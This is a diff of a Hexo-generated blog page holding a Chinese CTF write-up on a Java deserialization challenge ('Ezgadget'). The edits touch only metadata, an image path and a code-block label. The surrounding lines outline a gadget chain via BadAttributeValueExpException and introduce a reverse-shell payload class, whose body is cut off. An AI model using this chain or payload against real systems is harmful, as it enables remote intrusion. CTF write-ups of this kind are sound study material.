@@ -47,7 +47,7 @@ public class IndexController &amp;#123;
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -687,7 +687,7 @@ public class IndexController &amp;#123;
 <p>一搜toString，发现CC5里有类似调用！</p>
 <p>使用的是<code>BadAttributeValueExpException</code>，在其<code>readObject()</code>方法中调用了<code>toString()</code>，很符合这题。</p>
 <p>按CC5中思路，反射修改val属性即可。</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E4%B8%9C%E5%8D%8E%E6%9D%AF-Ezgadget/image-20220819232300079.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E4%B8%9C%E5%8D%8E%E6%9D%AF-Ezgadget/image-20220819232300079.png"></p>
 <p>写个反弹shell的恶意类</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> payload <span class="token punctuation">&#123;</span>
     <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
@@ -748,7 +748,7 @@ public class IndexController &amp;#123;
 <p>此处可以build后读取class文件，也可以用javassist来读。</p>
 <p>注意，尽量package保持一直，否则打进去后会找不到ToStringBean类导致白页。</p>
 <p>虚拟机运行一下环境，POST打入，结束。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar ezgadget.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ezgadget.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
                 
